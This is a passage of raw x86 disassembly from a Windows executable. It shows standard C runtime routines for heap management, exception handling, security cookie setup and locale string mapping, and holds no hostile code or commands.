  427013:	lea    edi,[eax+edi*1+0x4]
  427017:	not    ebx
  427019:	mov    DWORD PTR [ebp-0x14],ebx
  42701c:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  427020:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  427024:	dec    BYTE PTR [edi]
  427026:	jne    0x42705b
  427028:	mov    ecx,DWORD PTR [ebp-0x14]
  42702b:	mov    ebx,DWORD PTR [ebp+0x8]
  42702e:	and    DWORD PTR [ebx],ecx
  427030:	jmp    0x42705e
  427032:	lea    ecx,[edi-0x20]
  427035:	shr    ebx,cl
  427037:	mov    ecx,DWORD PTR [ebp-0x4]
  42703a:	lea    ecx,[eax+ecx*4+0xc4]
  427041:	lea    edi,[eax+edi*1+0x4]
  427045:	not    ebx
  427047:	and    DWORD PTR [ecx],ebx
  427049:	dec    BYTE PTR [edi]
  42704b:	mov    DWORD PTR [ebp-0x14],ebx
  42704e:	jne    0x42705b
  427050:	mov    ebx,DWORD PTR [ebp+0x8]
  427053:	mov    ecx,DWORD PTR [ebp-0x14]
  427056:	and    DWORD PTR [ebx+0x4],ecx
  427059:	jmp    0x42705e
  42705b:	mov    ebx,DWORD PTR [ebp+0x8]
  42705e:	cmp    DWORD PTR [ebp-0x8],0x0
  427062:	mov    ecx,DWORD PTR [edx+0x8]
  427065:	mov    edi,DWORD PTR [edx+0x4]
  427068:	mov    DWORD PTR [ecx+0x4],edi
  42706b:	mov    ecx,DWORD PTR [edx+0x4]
  42706e:	mov    edi,DWORD PTR [edx+0x8]
  427071:	mov    DWORD PTR [ecx+0x8],edi
  427074:	je     0x427107
  42707a:	mov    ecx,DWORD PTR [ebp-0xc]
  42707d:	lea    ecx,[ecx+esi*8]
  427080:	mov    edi,DWORD PTR [ecx+0x4]
  427083:	mov    DWORD PTR [edx+0x8],ecx
  427086:	mov    DWORD PTR [edx+0x4],edi
  427089:	mov    DWORD PTR [ecx+0x4],edx
  42708c:	mov    ecx,DWORD PTR [edx+0x4]
  42708f:	mov    DWORD PTR [ecx+0x8],edx
  427092:	mov    ecx,DWORD PTR [edx+0x4]
  427095:	cmp    ecx,DWORD PTR [edx+0x8]
  427098:	jne    0x4270f8
  42709a:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42709e:	mov    BYTE PTR [ebp+0xb],cl
  4270a1:	inc    cl
  4270a3:	cmp    esi,0x20
  4270a6:	mov    BYTE PTR [esi+eax*1+0x4],cl
  4270aa:	jge    0x4270cf
  4270ac:	cmp    BYTE PTR [ebp+0xb],0x0
  4270b0:	jne    0x4270bd
  4270b2:	mov    edi,0x80000000
  4270b7:	mov    ecx,esi
  4270b9:	shr    edi,cl
  4270bb:	or     DWORD PTR [ebx],edi
  4270bd:	mov    ecx,esi
  4270bf:	mov    edi,0x80000000
  4270c4:	shr    edi,cl
  4270c6:	mov    ecx,DWORD PTR [ebp-0x4]
  4270c9:	or     DWORD PTR [eax+ecx*4+0x44],edi
  4270cd:	jmp    0x4270f8
  4270cf:	cmp    BYTE PTR [ebp+0xb],0x0
  4270d3:	jne    0x4270e2
  4270d5:	lea    ecx,[esi-0x20]
  4270d8:	mov    edi,0x80000000
  4270dd:	shr    edi,cl
  4270df:	or     DWORD PTR [ebx+0x4],edi
  4270e2:	mov    ecx,DWORD PTR [ebp-0x4]
  4270e5:	lea    edi,[eax+ecx*4+0xc4]
  4270ec:	lea    ecx,[esi-0x20]
  4270ef:	mov    esi,0x80000000
  4270f4:	shr    esi,cl
  4270f6:	or     DWORD PTR [edi],esi
  4270f8:	mov    ecx,DWORD PTR [ebp-0x8]
  4270fb:	test   ecx,ecx
  4270fd:	je     0x42710a
  4270ff:	mov    DWORD PTR [edx],ecx
  427101:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  427105:	jmp    0x42710a
  427107:	mov    ecx,DWORD PTR [ebp-0x8]
  42710a:	mov    esi,DWORD PTR [ebp-0x10]
  42710d:	add    edx,ecx
  42710f:	lea    ecx,[esi+0x1]
  427112:	mov    DWORD PTR [edx],ecx
  427114:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  427118:	mov    esi,DWORD PTR [ebp-0xc]
  42711b:	mov    ecx,DWORD PTR [esi]
  42711d:	test   ecx,ecx
  42711f:	lea    edi,[ecx+0x1]
  427122:	mov    DWORD PTR [esi],edi
  427124:	jne    0x427140
  427126:	cmp    ebx,DWORD PTR ds:0x4674b8
  42712c:	jne    0x427140
  42712e:	mov    ecx,DWORD PTR [ebp-0x4]
  427131:	cmp    ecx,DWORD PTR ds:0x4674d0
  427137:	jne    0x427140
  427139:	and    DWORD PTR ds:0x4674b8,0x0
  427140:	mov    ecx,DWORD PTR [ebp-0x4]
  427143:	mov    DWORD PTR [eax],ecx
  427145:	lea    eax,[edx+0x4]
  427148:	pop    edi
  427149:	pop    esi
  42714a:	pop    ebx
  42714b:	leave  
  42714c:	ret    
  42714d:	int3   
  42714e:	int3   
  42714f:	int3   
  427150:	push   esi
  427151:	inc    ebx
  427152:	xor    dh,BYTE PTR [eax]
  427154:	pop    eax
  427155:	inc    ebx
  427156:	xor    BYTE PTR [eax],dh
  427158:	push   ebp
  427159:	mov    ebp,esp
  42715b:	sub    esp,0x8
  42715e:	push   ebx
  42715f:	push   esi
  427160:	push   edi
  427161:	push   ebp
  427162:	cld    
  427163:	mov    ebx,DWORD PTR [ebp+0xc]
  427166:	mov    eax,DWORD PTR [ebp+0x8]
  427169:	test   DWORD PTR [eax+0x4],0x6
  427170:	jne    0x4271f8
  427176:	mov    DWORD PTR [ebp-0x8],eax
  427179:	mov    eax,DWORD PTR [ebp+0x10]
  42717c:	mov    DWORD PTR [ebp-0x4],eax
  42717f:	lea    eax,[ebp-0x8]
  427182:	mov    DWORD PTR [ebx-0x4],eax
  427185:	mov    esi,DWORD PTR [ebx+0xc]
  427188:	mov    edi,DWORD PTR [ebx+0x8]
  42718b:	cmp    esi,0xffffffff
  42718e:	je     0x4271f1
  427190:	lea    ecx,[esi+esi*2]
  427193:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  427198:	je     0x4271df
  42719a:	push   esi
  42719b:	push   ebp
  42719c:	lea    ebp,[ebx+0x10]
  42719f:	call   DWORD PTR [edi+ecx*4+0x4]
  4271a3:	pop    ebp
  4271a4:	pop    esi
  4271a5:	mov    ebx,DWORD PTR [ebp+0xc]
  4271a8:	or     eax,eax
  4271aa:	je     0x4271df
  4271ac:	js     0x4271ea
  4271ae:	mov    edi,DWORD PTR [ebx+0x8]
  4271b1:	push   ebx
  4271b2:	call   0x4280e0
  4271b7:	add    esp,0x4
  4271ba:	lea    ebp,[ebx+0x10]
  4271bd:	push   esi
  4271be:	push   ebx
  4271bf:	call   0x428122
  4271c4:	add    esp,0x8
  4271c7:	lea    ecx,[esi+esi*2]
  4271ca:	push   0x1
  4271cc:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  4271d0:	call   0x4281b6
  4271d5:	mov    eax,DWORD PTR [edi+ecx*4]
  4271d8:	mov    DWORD PTR [ebx+0xc],eax
  4271db:	call   DWORD PTR [edi+ecx*4+0x8]
  4271df:	mov    edi,DWORD PTR [ebx+0x8]
  4271e2:	lea    ecx,[esi+esi*2]
  4271e5:	mov    esi,DWORD PTR [edi+ecx*4]
  4271e8:	jmp    0x42718b
  4271ea:	mov    eax,0x0
  4271ef:	jmp    0x42720d
  4271f1:	mov    eax,0x1
  4271f6:	jmp    0x42720d
  4271f8:	push   ebp
  4271f9:	lea    ebp,[ebx+0x10]
  4271fc:	push   0xffffffff
  4271fe:	push   ebx
  4271ff:	call   0x428122
  427204:	add    esp,0x8
  427207:	pop    ebp
  427208:	mov    eax,0x1
  42720d:	pop    ebp
  42720e:	pop    edi
  42720f:	pop    esi
  427210:	pop    ebx
  427211:	mov    esp,ebp
  427213:	pop    ebp
  427214:	ret    
  427215:	push   ebp
  427216:	mov    ecx,DWORD PTR [esp+0x8]
  42721a:	mov    ebp,DWORD PTR [ecx]
  42721c:	mov    eax,DWORD PTR [ecx+0x1c]
  42721f:	push   eax
  427220:	mov    eax,DWORD PTR [ecx+0x18]
  427223:	push   eax
  427224:	call   0x428122
  427229:	add    esp,0x8
  42722c:	pop    ebp
  42722d:	ret    0x4
  427230:	call   0x425145
  427235:	add    eax,0x8
  427238:	ret    
  427239:	push   0x14
  42723b:	push   0x4297c8
  427240:	call   0x425290
  427245:	mov    edi,DWORD PTR [ebp+0x8]
  427248:	xor    ebx,ebx
  42724a:	cmp    edi,ebx
  42724c:	jne    0x42725c
  42724e:	push   DWORD PTR [ebp+0xc]
  427251:	call   0x425fb2
  427256:	pop    ecx
  427257:	jmp    0x4273e0
  42725c:	mov    esi,DWORD PTR [ebp+0xc]
  42725f:	cmp    esi,ebx
  427261:	jne    0x42726f
  427263:	push   edi
  427264:	call   0x425e9a
  427269:	pop    ecx
  42726a:	jmp    0x4273de
  42726f:	cmp    DWORD PTR ds:0x467704,0x3
  427276:	jne    0x4273aa
  42727c:	mov    DWORD PTR [ebp-0x1c],ebx
  42727f:	cmp    esi,0xffffffe0
  427282:	ja     0x427379
  427288:	push   0x4
  42728a:	call   0x42544f
  42728f:	pop    ecx
  427290:	mov    DWORD PTR [ebp-0x4],ebx
  427293:	push   edi
  427294:	call   0x426672
  427299:	pop    ecx
  42729a:	mov    DWORD PTR [ebp-0x20],eax
  42729d:	cmp    eax,ebx
  42729f:	je     0x427349
  4272a5:	cmp    esi,DWORD PTR ds:0x4674c4
  4272ab:	ja     0x4272f9
  4272ad:	push   esi
  4272ae:	push   edi
  4272af:	push   eax
  4272b0:	call   0x426b72
  4272b5:	add    esp,0xc
  4272b8:	test   eax,eax
  4272ba:	je     0x4272c1
  4272bc:	mov    DWORD PTR [ebp-0x1c],edi
  4272bf:	jmp    0x4272f9
  4272c1:	push   esi
  4272c2:	call   0x426e51
  4272c7:	pop    ecx
  4272c8:	mov    DWORD PTR [ebp-0x1c],eax
  4272cb:	cmp    eax,ebx
  4272cd:	je     0x4272f9
  4272cf:	mov    eax,DWORD PTR [edi-0x4]
  4272d2:	dec    eax
  4272d3:	mov    DWORD PTR [ebp-0x24],eax
  4272d6:	cmp    eax,esi
  4272d8:	jb     0x4272dc
  4272da:	mov    eax,esi
  4272dc:	push   eax
  4272dd:	push   edi
  4272de:	push   DWORD PTR [ebp-0x1c]
  4272e1:	call   0x425fd0
  4272e6:	push   edi
  4272e7:	call   0x426672
  4272ec:	mov    DWORD PTR [ebp-0x20],eax
  4272ef:	push   edi
  4272f0:	push   eax
  4272f1:	call   0x42669d
  4272f6:	add    esp,0x18
  4272f9:	cmp    DWORD PTR [ebp-0x1c],ebx
  4272fc:	jne    0x427349
  4272fe:	cmp    esi,ebx
  427300:	jne    0x427308
  427302:	xor    esi,esi
  427304:	inc    esi
  427305:	mov    DWORD PTR [ebp+0xc],esi
  427308:	add    esi,0xf
  42730b:	and    esi,0xfffffff0
  42730e:	mov    DWORD PTR [ebp+0xc],esi
  427311:	push   esi
  427312:	push   ebx
  427313:	push   DWORD PTR ds:0x467700
  427319:	call   DWORD PTR ds:0x4290dc
  42731f:	mov    DWORD PTR [ebp-0x1c],eax
  427322:	cmp    eax,ebx
  427324:	je     0x427349
  427326:	mov    eax,DWORD PTR [edi-0x4]
  427329:	dec    eax
  42732a:	mov    DWORD PTR [ebp-0x24],eax
  42732d:	cmp    eax,esi
  42732f:	jb     0x427333
  427331:	mov    eax,esi
  427333:	push   eax
  427334:	push   edi
  427335:	push   DWORD PTR [ebp-0x1c]
  427338:	call   0x425fd0
  42733d:	push   edi
  42733e:	push   DWORD PTR [ebp-0x20]
  427341:	call   0x42669d
  427346:	add    esp,0x14
  427349:	or     DWORD PTR [ebp-0x4],0xffffffff
  42734d:	call   0x4273a1
  427352:	cmp    DWORD PTR [ebp-0x20],ebx
  427355:	jne    0x427379
  427357:	cmp    esi,ebx
  427359:	jne    0x42735e
  42735b:	xor    esi,esi
  42735d:	inc    esi
  42735e:	add    esi,0xf
  427361:	and    esi,0xfffffff0
  427364:	mov    DWORD PTR [ebp+0xc],esi
  427367:	push   esi
  427368:	push   edi
  427369:	push   ebx
  42736a:	push   DWORD PTR ds:0x467700
  427370:	call   DWORD PTR ds:0x4290e8
  427376:	mov    DWORD PTR [ebp-0x1c],eax
  427379:	mov    eax,DWORD PTR [ebp-0x1c]
  42737c:	cmp    eax,ebx
  42737e:	jne    0x4273e0
  427380:	cmp    DWORD PTR ds:0x467388,ebx
  427386:	je     0x4273e0
  427388:	push   esi
  427389:	call   0x427b72
  42738e:	pop    ecx
  42738f:	test   eax,eax
  427391:	jne    0x42727c
  427397:	jmp    0x4273de
  427399:	xor    ebx,ebx
  42739b:	mov    esi,DWORD PTR [ebp+0xc]
  42739e:	mov    edi,DWORD PTR [ebp+0x8]
  4273a1:	push   0x4
  4273a3:	call   0x4253bb
  4273a8:	pop    ecx
  4273a9:	ret    
  4273aa:	xor    eax,eax
  4273ac:	cmp    esi,0xffffffe0
  4273af:	ja     0x4273c7
  4273b1:	cmp    esi,ebx
  4273b3:	jne    0x4273b8
  4273b5:	xor    esi,esi
  4273b7:	inc    esi
  4273b8:	push   esi
  4273b9:	push   edi
  4273ba:	push   ebx
  4273bb:	push   DWORD PTR ds:0x467700
  4273c1:	call   DWORD PTR ds:0x4290e8
  4273c7:	cmp    eax,ebx
  4273c9:	jne    0x4273e0
  4273cb:	cmp    DWORD PTR ds:0x467388,ebx
  4273d1:	je     0x4273e0
  4273d3:	push   esi
  4273d4:	call   0x427b72
  4273d9:	pop    ecx
  4273da:	test   eax,eax
  4273dc:	jne    0x4273aa
  4273de:	xor    eax,eax
  4273e0:	call   0x4252cb
  4273e5:	ret    
  4273e6:	push   0x10
  4273e8:	push   0x4297d8
  4273ed:	call   0x425290
  4273f2:	cmp    DWORD PTR ds:0x467704,0x3
  4273f9:	jne    0x427435
  4273fb:	push   0x4
  4273fd:	call   0x42544f
  427402:	pop    ecx
  427403:	and    DWORD PTR [ebp-0x4],0x0
  427407:	mov    esi,DWORD PTR [ebp+0x8]
  42740a:	push   esi
  42740b:	call   0x426672
  427410:	pop    ecx
  427411:	mov    DWORD PTR [ebp-0x1c],eax
  427414:	test   eax,eax
  427416:	je     0x427423
  427418:	mov    esi,DWORD PTR [esi-0x4]
  42741b:	sub    esi,0x9
  42741e:	mov    DWORD PTR [ebp-0x20],esi
  427421:	jmp    0x427426
  427423:	mov    esi,DWORD PTR [ebp-0x20]
  427426:	or     DWORD PTR [ebp-0x4],0xffffffff
  42742a:	call   0x427453
  42742f:	cmp    DWORD PTR [ebp-0x1c],0x0
  427433:	jne    0x427448
  427435:	push   DWORD PTR [ebp+0x8]
  427438:	push   0x0
  42743a:	push   DWORD PTR ds:0x467700
  427440:	call   DWORD PTR ds:0x4290ec
  427446:	mov    esi,eax
  427448:	mov    eax,esi
  42744a:	call   0x4252cb
  42744f:	ret    
  427450:	mov    esi,DWORD PTR [ebp-0x20]
  427453:	push   0x4
  427455:	call   0x4253bb
  42745a:	pop    ecx
  42745b:	ret    
  42745c:	push   ebp
  42745d:	mov    ebp,esp
  42745f:	sub    esp,0x10
  427462:	push   esi
  427463:	lea    eax,[ebp-0x8]
  427466:	push   eax
  427467:	call   DWORD PTR ds:0x4290fc
  42746d:	mov    esi,DWORD PTR [ebp-0x4]
  427470:	xor    esi,DWORD PTR [ebp-0x8]
  427473:	call   DWORD PTR ds:0x4290f8
  427479:	xor    esi,eax
  42747b:	call   DWORD PTR ds:0x4290b4
  427481:	xor    esi,eax
  427483:	call   DWORD PTR ds:0x4290f4
  427489:	xor    esi,eax
  42748b:	lea    eax,[ebp-0x10]
  42748e:	push   eax
  42748f:	call   DWORD PTR ds:0x4290f0
  427495:	mov    eax,DWORD PTR [ebp-0xc]
  427498:	xor    eax,DWORD PTR [ebp-0x10]
  42749b:	xor    esi,eax
  42749d:	mov    DWORD PTR ds:0x4669f0,esi
  4274a3:	jne    0x4274af
  4274a5:	mov    DWORD PTR ds:0x4669f0,0xbb40e64e
  4274af:	pop    esi
  4274b0:	leave  
  4274b1:	ret    
  4274b2:	push   0x118
  4274b7:	push   0x429988
  4274bc:	call   0x425290
  4274c1:	mov    eax,ds:0x4669f0
  4274c6:	xor    eax,DWORD PTR [ebp+0x4]
  4274c9:	mov    DWORD PTR [ebp-0x1c],eax
  4274cc:	mov    eax,ds:0x467358
  4274d1:	xor    ecx,ecx
  4274d3:	cmp    eax,ecx
  4274d5:	je     0x4274f6
  4274d7:	mov    DWORD PTR [ebp-0x4],ecx
  4274da:	push   DWORD PTR [ebp+0xc]
  4274dd:	push   DWORD PTR [ebp+0x8]
  4274e0:	call   eax
  4274e2:	pop    ecx
  4274e3:	pop    ecx
  4274e4:	or     DWORD PTR [ebp-0x4],0xffffffff
  4274e8:	jmp    0x4275f4
  4274ed:	xor    eax,eax
  4274ef:	inc    eax
  4274f0:	ret    
  4274f1:	mov    esp,DWORD PTR [ebp-0x18]
  4274f4:	jmp    0x4274e4
  4274f6:	mov    eax,DWORD PTR [ebp+0x8]
  4274f9:	dec    eax
  4274fa:	je     0x42750f
  4274fc:	mov    edi,0x429964
  427501:	mov    DWORD PTR [ebp-0x20],0x4298b0
  427508:	mov    esi,0xd4
  42750d:	jmp    0x427520
  42750f:	mov    edi,0x429890
  427514:	mov    DWORD PTR [ebp-0x20],0x4297f0
  42751b:	mov    esi,0xb9
  427520:	mov    BYTE PTR [ebp-0x24],cl
  427523:	push   0x104
  427528:	lea    eax,[ebp-0x128]
  42752e:	push   eax
  42752f:	push   ecx
  427530:	call   DWORD PTR ds:0x429084
  427536:	test   eax,eax
  427538:	jne    0x42754d
  42753a:	push   0x4294e4
  42753f:	lea    eax,[ebp-0x128]
  427545:	push   eax
  427546:	call   0x425670
  42754b:	pop    ecx
  42754c:	pop    ecx
  42754d:	lea    ebx,[ebp-0x128]
  427553:	lea    eax,[ebp-0x128]
  427559:	push   eax
  42755a:	call   0x4258a0
  42755f:	pop    ecx
  427560:	add    eax,0xb
  427563:	cmp    eax,0x3c
  427566:	jbe    0x427591
  427568:	lea    eax,[ebp-0x128]
  42756e:	push   eax
  42756f:	call   0x4258a0
  427574:	mov    ebx,eax
  427576:	lea    eax,[ebp-0x128]
  42757c:	sub    eax,0x31
  42757f:	add    ebx,eax
  427581:	push   0x3
  427583:	push   0x4294e0
  427588:	push   ebx
  427589:	call   0x425770
  42758e:	add    esp,0x10
  427591:	push   ebx
  427592:	call   0x4258a0
  427597:	pop    ecx
  427598:	lea    eax,[eax+esi*1+0xc]
  42759c:	add    eax,0x3
  42759f:	and    eax,0xfffffffc
  4275a2:	call   0x4252e0
  4275a7:	mov    DWORD PTR [ebp-0x18],esp
  4275aa:	mov    esi,esp
  4275ac:	push   edi
  4275ad:	push   esi
  4275ae:	call   0x425670
  4275b3:	mov    edi,0x4294c0
  4275b8:	push   edi
  4275b9:	push   esi
  4275ba:	call   0x425680
  4275bf:	push   0x4297e4
  4275c4:	push   esi
  4275c5:	call   0x425680
  4275ca:	push   ebx
  4275cb:	push   esi
  4275cc:	call   0x425680
  4275d1:	push   edi
  4275d2:	push   esi
  4275d3:	call   0x425680
  4275d8:	push   DWORD PTR [ebp-0x20]
  4275db:	push   esi
  4275dc:	call   0x425680
  4275e1:	push   0x12010
  4275e6:	push   0x429498
  4275eb:	push   esi
  4275ec:	call   0x425572
  4275f1:	add    esp,0x3c
  4275f4:	push   0x3
  4275f6:	call   0x4246fe
  4275fb:	int3   
  4275fc:	push   0x38
  4275fe:	push   0x429da8
  427603:	call   0x425290
  427608:	xor    ebx,ebx
  42760a:	cmp    DWORD PTR ds:0x46737c,ebx
  427610:	jne    0x42764a
  427612:	push   ebx
  427613:	push   ebx
  427614:	xor    esi,esi
  427616:	inc    esi
  427617:	push   esi
  427618:	push   0x429da4
  42761d:	push   0x100
  427622:	push   ebx
  427623:	call   DWORD PTR ds:0x429108
  427629:	test   eax,eax
  42762b:	je     0x427635
  42762d:	mov    DWORD PTR ds:0x46737c,esi
  427633:	jmp    0x42764a
  427635:	call   DWORD PTR ds:0x429034
  42763b:	cmp    eax,0x78
  42763e:	jne    0x42764a
  427640:	mov    DWORD PTR ds:0x46737c,0x2
  42764a:	cmp    DWORD PTR [ebp+0x14],ebx
  42764d:	jle    0x42766a
  42764f:	mov    ecx,DWORD PTR [ebp+0x14]
  427652:	mov    eax,DWORD PTR [ebp+0x10]
  427655:	dec    ecx
  427656:	cmp    BYTE PTR [eax],bl
  427658:	je     0x427662
  42765a:	inc    eax
  42765b:	cmp    ecx,ebx
  42765d:	jne    0x427655
  42765f:	or     ecx,0xffffffff
  427662:	or     eax,0xffffffff
  427665:	sub    eax,ecx
  427667:	add    DWORD PTR [ebp+0x14],eax
  42766a:	mov    eax,ds:0x46737c
  42766f:	cmp    eax,0x2
  427672:	je     0x427854
  427678:	cmp    eax,ebx
  42767a:	je     0x427854
  427680:	cmp    eax,0x1
  427683:	jne    0x427887
  427689:	xor    edi,edi
  42768b:	mov    DWORD PTR [ebp-0x1c],edi
  42768e:	mov    DWORD PTR [ebp-0x20],ebx
  427691:	mov    DWORD PTR [ebp-0x24],ebx
  427694:	cmp    DWORD PTR [ebp+0x20],ebx
  427697:	jne    0x4276a1
  427699:	mov    eax,ds:0x467374
  42769e:	mov    DWORD PTR [ebp+0x20],eax
  4276a1:	push   ebx
  4276a2:	push   ebx
  4276a3:	push   DWORD PTR [ebp+0x14]
  4276a6:	push   DWORD PTR [ebp+0x10]
  4276a9:	xor    eax,eax
  4276ab:	cmp    DWORD PTR [ebp+0x24],ebx
  4276ae:	setne  al
  4276b1:	lea    eax,[eax*8+0x1]
  4276b8:	push   eax
  4276b9:	push   DWORD PTR [ebp+0x20]
  4276bc:	call   DWORD PTR ds:0x429104
  4276c2:	mov    esi,eax
  4276c4:	mov    DWORD PTR [ebp-0x28],esi
  4276c7:	cmp    esi,ebx
  4276c9:	je     0x427887
  4276cf:	mov    DWORD PTR [ebp-0x4],0x1
  4276d6:	lea    eax,[esi+esi*1]
  4276d9:	add    eax,0x3
  4276dc:	and    eax,0xfffffffc
  4276df:	call   0x4252e0
  4276e4:	mov    DWORD PTR [ebp-0x18],esp
  4276e7:	mov    eax,esp
  4276e9:	mov    DWORD PTR [ebp-0x2c],eax
  4276ec:	or     DWORD PTR [ebp-0x4],0xffffffff
  4276f0:	jmp    0x42770d
  4276f2:	xor    eax,eax
  4276f4:	inc    eax
  4276f5:	ret    
  4276f6:	mov    esp,DWORD PTR [ebp-0x18]
  4276f9:	call   0x428725
  4276fe:	xor    ebx,ebx
  427700:	mov    DWORD PTR [ebp-0x2c],ebx
  427703:	or     DWORD PTR [ebp-0x4],0xffffffff
  427707:	mov    edi,DWORD PTR [ebp-0x1c]
  42770a:	mov    esi,DWORD PTR [ebp-0x28]
  42770d:	cmp    DWORD PTR [ebp-0x2c],ebx
  427710:	jne    0x42772e
  427712:	lea    eax,[esi+esi*1]
  427715:	push   eax
  427716:	call   0x425fb2
  42771b:	pop    ecx
  42771c:	mov    DWORD PTR [ebp-0x2c],eax
  42771f:	cmp    eax,ebx
  427721:	je     0x427887
  427727:	mov    DWORD PTR [ebp-0x20],0x1
  42772e:	push   esi
  42772f:	push   DWORD PTR [ebp-0x2c]
  427732:	push   DWORD PTR [ebp+0x14]
  427735:	push   DWORD PTR [ebp+0x10]
  427738:	push   0x1
  42773a:	push   DWORD PTR [ebp+0x20]
  42773d:	call   DWORD PTR ds:0x429104
  427743:	test   eax,eax
  427745:	je     0x427831
  42774b:	push   ebx
  42774c:	push   ebx
  42774d:	push   esi
  42774e:	push   DWORD PTR [ebp-0x2c]
  427751:	push   DWORD PTR [ebp+0xc]
  427754:	push   DWORD PTR [ebp+0x8]
  427757:	call   DWORD PTR ds:0x429108
  42775d:	mov    edi,eax
  42775f:	mov    DWORD PTR [ebp-0x1c],edi
  427762:	cmp    edi,ebx
  427764:	je     0x427831
  42776a:	test   BYTE PTR [ebp+0xd],0x4
  42776e:	je     0x42779d
  427770:	cmp    DWORD PTR [ebp+0x1c],ebx
  427773:	je     0x427831
  427779:	cmp    edi,DWORD PTR [ebp+0x1c]
  42777c:	jg     0x427831
  427782:	push   DWORD PTR [ebp+0x1c]
  427785:	push   DWORD PTR [ebp+0x18]
  427788:	push   esi
  427789:	push   DWORD PTR [ebp-0x2c]
  42778c:	push   DWORD PTR [ebp+0xc]
  42778f:	push   DWORD PTR [ebp+0x8]
  427792:	call   DWORD PTR ds:0x429108
  427798:	jmp    0x427831
  42779d:	mov    DWORD PTR [ebp-0x4],0x2
  4277a4:	lea    eax,[edi+edi*1]
  4277a7:	add    eax,0x3
  4277aa:	and    eax,0xfffffffc
  4277ad:	call   0x4252e0
  4277b2:	mov    DWORD PTR [ebp-0x18],esp
  4277b5:	mov    eax,esp
  4277b7:	mov    DWORD PTR [ebp-0x30],eax
  4277ba:	or     DWORD PTR [ebp-0x4],0xffffffff
  4277be:	jmp    0x4277db
  4277c0:	xor    eax,eax
  4277c2:	inc    eax
  4277c3:	ret    
  4277c4:	mov    esp,DWORD PTR [ebp-0x18]
  4277c7:	call   0x428725
  4277cc:	xor    ebx,ebx
  4277ce:	mov    DWORD PTR [ebp-0x30],ebx
  4277d1:	or     DWORD PTR [ebp-0x4],0xffffffff
  4277d5:	mov    edi,DWORD PTR [ebp-0x1c]
  4277d8:	mov    esi,DWORD PTR [ebp-0x28]
  4277db:	cmp    DWORD PTR [ebp-0x30],ebx
  4277de:	jne    0x4277f8
  4277e0:	lea    eax,[edi+edi*1]
  4277e3:	push   eax
  4277e4:	call   0x425fb2
  4277e9:	pop    ecx
  4277ea:	mov    DWORD PTR [ebp-0x30],eax
  4277ed:	cmp    eax,ebx
  4277ef:	je     0x427831
  4277f1:	mov    DWORD PTR [ebp-0x24],0x1
  4277f8:	push   edi
  4277f9:	push   DWORD PTR [ebp-0x30]
  4277fc:	push   esi
  4277fd:	push   DWORD PTR [ebp-0x2c]
  427800:	push   DWORD PTR [ebp+0xc]
  427803:	push   DWORD PTR [ebp+0x8]
  427806:	call   DWORD PTR ds:0x429108
  42780c:	test   eax,eax
  42780e:	je     0x427831
  427810:	push   ebx
  427811:	push   ebx
  427812:	cmp    DWORD PTR [ebp+0x1c],ebx
  427815:	jne    0x42781b
  427817:	push   ebx
  427818:	push   ebx
  427819:	jmp    0x427821
  42781b:	push   DWORD PTR [ebp+0x1c]
  42781e:	push   DWORD PTR [ebp+0x18]
  427821:	push   edi
  427822:	push   DWORD PTR [ebp-0x30]
  427825:	push   ebx
  427826:	push   DWORD PTR [ebp+0x20]
  427829:	call   DWORD PTR ds:0x429098
  42782f:	mov    edi,eax
  427831:	cmp    DWORD PTR [ebp-0x24],ebx
  427834:	je     0x42783f
  427836:	push   DWORD PTR [ebp-0x30]
  427839:	call   0x425e9a
  42783e:	pop    ecx
  42783f:	cmp    DWORD PTR [ebp-0x20],ebx
  427842:	je     0x42784d
  427844:	push   DWORD PTR [ebp-0x2c]
  427847:	call   0x425e9a
  42784c:	pop    ecx
  42784d:	mov    eax,edi
  42784f:	jmp    0x4279af
  427854:	mov    DWORD PTR [ebp-0x34],ebx
  427857:	xor    edi,edi
  427859:	mov    DWORD PTR [ebp-0x38],ebx
  42785c:	cmp    DWORD PTR [ebp+0x8],ebx
  42785f:	jne    0x427869
  427861:	mov    eax,ds:0x467364
  427866:	mov    DWORD PTR [ebp+0x8],eax
  427869:	cmp    DWORD PTR [ebp+0x20],ebx
  42786c:	jne    0x427876
  42786e:	mov    eax,ds:0x467374
  427873:	mov    DWORD PTR [ebp+0x20],eax
  427876:	push   DWORD PTR [ebp+0x8]
  427879:	call   0x42850d
  42787e:	pop    ecx
  42787f:	mov    DWORD PTR [ebp-0x3c],eax
  427882:	cmp    eax,0xffffffff
  427885:	jne    0x42788e
  427887:	xor    eax,eax
  427889:	jmp    0x4279af
  42788e:	cmp    eax,DWORD PTR [ebp+0x20]
  427891:	je     0x427985
  427897:	push   ebx
  427898:	push   ebx
  427899:	lea    ecx,[ebp+0x14]
  42789c:	push   ecx
  42789d:	push   DWORD PTR [ebp+0x10]
  4278a0:	push   eax
  4278a1:	push   DWORD PTR [ebp+0x20]
  4278a4:	call   0x428556
  4278a9:	add    esp,0x18
  4278ac:	mov    DWORD PTR [ebp-0x34],eax
  4278af:	cmp    eax,ebx
  4278b1:	je     0x427887
  4278b3:	push   ebx
  4278b4:	push   ebx
  4278b5:	push   DWORD PTR [ebp+0x14]
  4278b8:	push   eax
  4278b9:	push   DWORD PTR [ebp+0xc]
  4278bc:	push   DWORD PTR [ebp+0x8]
  4278bf:	call   DWORD PTR ds:0x429100
  4278c5:	mov    esi,eax
  4278c7:	mov    DWORD PTR [ebp-0x40],esi
  4278ca:	cmp    esi,ebx
  4278cc:	je     0x427974
  4278d2:	mov    DWORD PTR [ebp-0x4],ebx
  4278d5:	add    eax,0x3
  4278d8:	and    eax,0xfffffffc
  4278db:	call   0x4252e0
  4278e0:	mov    DWORD PTR [ebp-0x18],esp
  4278e3:	mov    edi,esp
  4278e5:	mov    DWORD PTR [ebp-0x44],edi
  4278e8:	push   esi
  4278e9:	push   ebx
  4278ea:	push   edi
  4278eb:	call   0x427b90
  4278f0:	add    esp,0xc
  4278f3:	jmp    0x427905
  4278f5:	xor    eax,eax
  4278f7:	inc    eax
  4278f8:	ret    
  4278f9:	mov    esp,DWORD PTR [ebp-0x18]
  4278fc:	call   0x428725
  427901:	xor    ebx,ebx
  427903:	xor    edi,edi
  427905:	or     DWORD PTR [ebp-0x4],0xffffffff
  427909:	cmp    edi,ebx
  42790b:	jne    0x427930
  42790d:	push   DWORD PTR [ebp-0x40]
  427910:	call   0x425fb2
